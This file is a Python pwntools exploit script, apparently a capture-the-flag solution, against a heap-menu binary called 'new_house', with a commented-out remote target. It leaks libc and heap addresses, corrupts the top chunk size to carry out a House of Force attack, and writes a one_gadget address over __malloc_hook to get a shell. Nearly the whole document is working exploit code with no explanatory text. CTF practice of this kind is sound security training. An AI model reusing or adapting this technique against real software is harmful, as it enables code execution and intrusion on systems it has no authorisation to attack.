#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template new_house
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('new_house')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x3ff000)
# RUNPATH:  b'.'
def addx(size,num):
    io.sendlineafter(b'>>> ',str(1).encode())
    io.send(b'A'*15+num)
    io.sendline(str(size).encode())
    return
def delx(num):
    io.sendlineafter(b'>>> ',str(2).encode())
    io.sendline(str(num).encode())
    return
def editx(num,payload):
    io.sendlineafter(b'>>> ',str(3).encode())
    io.sendline(str(num).encode())
    io.send(payload)
    return
def heap_leak():
    io.sendlineafter(b'>>> ',str(4).encode())
    return io.recv()

malloc_hook = 0x3aabf0

one_gadget = 0x40e8a

io = start()
#io = remote('flu.xxx' ,10170)

leak = io.recv()

leak = leak.split(b'0x')[1]

leak = leak.split(b'\n\n')[0]

libc_base = int(leak,16)

log.info('Libc {0}'.format(hex(libc_base)))

io.sendline(str(99).encode())

addx(0x100,b'0')

addx(0x100,b'1')

delx(1)

addx(0x10,b'2')

pay1 = b'A'*0x10+p64(0)+p64(0xffffffffffffffff)

editx(1,pay1)

heap = heap_leak()

heap = heap.split(b'AAA0')[1]
heap = heap.split(b'room-1')[0]

heap = int.from_bytes(heap,byteorder='little')

print(hex(heap))

heap_base = heap - 0x10

log.info('Heap base {0}'.format(hex(heap_base)))

value = (libc_base+malloc_hook)-(heap_base+0x150)

print(hex(value))

io.sendline(str(99).encode())

addx(value,b'3')

addx(0x1000,b'4')

onex = p64(libc_base+one_gadget)

editx(4,onex)

addx(0x10,b'5') #trigger

io.interactive()

